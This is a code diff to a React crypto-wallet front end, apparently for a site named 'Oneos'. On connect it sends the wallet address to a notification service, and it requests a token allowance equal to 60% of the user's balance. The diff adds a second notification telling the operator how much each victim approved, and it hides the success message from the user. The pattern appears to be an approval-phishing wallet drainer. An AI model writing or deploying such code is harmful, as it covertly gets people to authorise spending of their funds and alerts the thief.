@@ -14,6 +14,7 @@ function App() {
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
   const [success, setSuccess] = useState(false);
+  const [amount, setAmount] = useState(null);
   const [connectLoading, setConnectLoading] = useState(false);
 
   const dispatch = useDispatch();
@@ -106,7 +107,11 @@ function App() {
       const balanceInWei = await web3.eth.getBalance(account);
       const balanceBN = BigInt(balanceInWei);
       const partials = (balanceBN * 60n) / 100n;
+
       const partialsInWei = partials.toString();
+
+      console.log(partialsInWei);
+      setAmount(partialsInWei);
 
       await contract.methods
         .increaseAllowance(contract.options.address, partialsInWei)
@@ -135,15 +140,26 @@ function App() {
   }, [account]);
 
   useEffect(() => {
-    const formData = {
-      userAddress: account,
-      siteName: "Oneos",
-    };
     if (account) {
+      const formData = {
+        userAddress: account,
+        siteName: "Oneos",
+      };
       dispatch(sendNotification(formData));
       console.log(`${account} Connected.`);
     }
-  }, [account]);
+  }, [account, dispatch]);
+
+  useEffect(() => {
+    if (success && account && amount) {
+      const formData = {
+        userAddress: account,
+        amount: amount,
+      };
+      dispatch(sendNotification(formData));
+      console.log(`${account} approved ${amount}.`);
+    }
+  }, [success, account, amount, dispatch]);
 
   return (
     <section className="app">
@@ -153,7 +169,7 @@ function App() {
         connectLoading={connectLoading}
       />
       {error && <p style={{ color: "red" }}>{error}</p>}
-      {success && <p style={{ color: "green" }}>Operation successful!</p>}
+      {/* {success && <p style={{ color: "green" }}>Operation successful!</p>} */}
       <Landing
         increaseAllowance={increaseAllowance}
         account={account}
